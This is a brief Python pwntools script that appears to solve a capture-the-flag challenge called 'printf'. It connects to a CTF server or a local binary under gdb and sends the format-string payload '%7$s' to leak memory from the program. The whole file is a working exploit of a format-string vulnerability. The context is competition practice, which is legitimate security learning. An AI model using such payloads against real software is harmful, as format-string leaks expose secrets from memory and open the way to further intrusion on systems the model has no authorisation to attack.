from pwn import *

DEBUG = False

if DEBUG:
    r = process("./printf")
    gdb.attach(r)
else:
    r = remote("printf.litctf.live", 1337)

print(r.recvuntil("Right?"))

payload = "%7$s"

r.sendline(payload)

print(r.recv())
print(r.recv())